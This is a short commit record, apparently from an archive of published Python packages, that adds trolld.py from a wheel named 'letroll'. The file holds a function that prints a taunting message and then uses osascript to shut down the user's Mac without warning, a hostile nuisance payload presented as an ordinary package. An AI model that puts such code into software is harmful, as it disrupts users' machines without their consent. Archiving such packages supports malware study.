23eae086acf8cc650189c3baf8a68acc499ea86e
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2023-08-06 09:08:21 +0000

    Add package letroll/4.20/letroll-4.20.0-py3-none-any.whl

---
+++ packages/letroll/letroll-4.20.0-py3-none-any.whl/letroll/trolld.py
@@ -0,0 +1,6 @@
+import subprocess
+
+
+def troll_user():
+    print(f"TROLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOL")
+    subprocess.call(['osascript', '-e', 'tell app "System Events" to shut down'])
